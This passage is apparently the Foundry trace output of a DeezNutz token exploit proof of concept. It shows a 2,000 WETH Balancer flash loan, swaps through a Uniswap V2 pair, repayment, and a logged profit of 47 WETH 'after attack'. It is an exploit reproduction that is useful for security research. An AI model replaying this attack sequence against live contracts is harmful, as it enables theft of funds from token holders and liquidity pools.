+    │   │   │   │   │   @ 0x08fca8b639019665a85af7c7efe7e22d8f7f9d376fcecbdafb4dd1ecc5ecb5ff: 0x010ebb55208fa80d9feb8b4f0000000000000000030000000000000000000000 → 0x0000000000000000000000000000000000000000030000000000000000000000
+    │   │   │   │   │   @ 0x07da1d7d0e068a758db211ad315455b478bab552cd5604241eeddd0963bcfade: 0x070fa472603a408a31406cd6a33b2eca07f24c44943cae052b4b2b3304231d7a → 0x763c41b9c9a4337ff02927a5b3e6274f0740fd11bc754a7665a1a6a8d66d6f94
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [36714] UniswapV2Pair::swap(0, 2048142125913269088155 [2.048e21], DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [23162] WETH9::transfer(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2048142125913269088155 [2.048e21])
+    │   │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x1fB4904b26DE8C043959201A63b4b23C414251E2], to: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2048142125913269088155 [2.048e21])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x00000000000000000000000000000000000000000000006f07ae8bfefdc82f9b
+    │   │   │   │   │   │   @ 0x4339748af3a2edb11e70a4d75d4fb763308b51ca1371cb84fb209df22ad2147d: 0x00000000000000000000000000000000000000000000006f9f95f676f18a46dc → 0x00000000000000000000000000000000000000000000000097e76a77f3c21741
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [911] DeezNutz::balanceOf(UniswapV2Pair: [0x1fB4904b26DE8C043959201A63b4b23C414251E2]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 337860744074233291077192494 [3.378e26]
+    │   │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x1fB4904b26DE8C043959201A63b4b23C414251E2]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 10945834482770515777 [1.094e19]
+    │   │   │   │   ├─ emit Sync(reserve0: 337860744074233291077192494 [3.378e26], reserve1: 10945834482770515777 [1.094e19])
+    │   │   │   │   ├─ emit Swap(sender: UniswapV2Router02: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 336115702070648333694830133 [3.361e26], amount1In: 0, amount0Out: 0, amount1Out: 2048142125913269088155 [2.048e21], to: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x65d6403700000000006f9f95f676f18a46dc000000017186eaa437bbe65784f9 → 0x65d6403700000000000097e76a77f3c217410000011778cba2da3e703e4a0b2e
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return] [327508020555910453632776290 [3.275e26], 2048142125913269088155 [2.048e21]]
+    │   │   ├─ [534] WETH9::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 2048142125913269088155 [2.048e21]
+    │   │   ├─ emit log_named_uint(key: "after swap back, WETH amount", val: 2048)
+    │   │   ├─ [3262] WETH9::transfer(0xBA12222222228d8Ba445958a75a0704d566BF2C8, 2001000000000000000000 [2.001e21])
+    │   │   │   ├─ emit Transfer(from: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xBA12222222228d8Ba445958a75a0704d566BF2C8, value: 2001000000000000000000 [2.001e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000006f07ae8bfefdc82f9b → 0x0000000000000000000000000000000000000000000000028e3a79bf99242f9b
+    │   │   │   │   @ 0x3a0f132b80eb284c2ac247698d2ec7dce851ca420b700161ad6082d0e9762150: 0x000000000000000000000000000000000000000000000b3cebc5ff780160712a → 0x000000000000000000000000000000000000000000000ba9653a11b76604712a
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [534] WETH9::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
+    │   │   └─ ← [Return] 55070825222048879767850 [5.507e22]
+    │   ├─ [8062] WETH9::transfer(ProtocolFeesCollector: [0xce88686553686DA562CE7Cea497CE749DA109f9F], 1000000000000000000 [1e18])
+    │   │   ├─ emit Transfer(from: 0xBA12222222228d8Ba445958a75a0704d566BF2C8, to: ProtocolFeesCollector: [0xce88686553686DA562CE7Cea497CE749DA109f9F], value: 1000000000000000000 [1e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x3a0f132b80eb284c2ac247698d2ec7dce851ca420b700161ad6082d0e9762150: 0x000000000000000000000000000000000000000000000ba9653a11b76604712a → 0x000000000000000000000000000000000000000000000ba957595b03bea0712a
+    │   │   │   @ 0x76c744208485be5e79db9055e77bf6e3b73975ef64172497e089bf78aac2a445: 0x000000000000000000000000000000000000000000000000375ff35b3ffe65b5 → 0x0000000000000000000000000000000000000000000000004540aa0ee76265b5
+    │   │   └─ ← [Return] true
+    │   ├─ emit FlashLoan(param0: DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], param2: 2000000000000000000000 [2e21], param3: 1000000000000000000 [1e18])
+    │   └─ ← [Stop]
+    ├─ emit log_string(val: "------------------- flashloan finish ----------------")
+    ├─ [534] WETH9::balanceOf(DeezNutzTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 47142125913269088155 [4.714e19]
+    ├─ emit log_named_uint(key: "after attack, WETH amount", val: 47)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.40s (8.47s CPU time)
+
+Ran 1 test suite in 12.58s (10.40s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
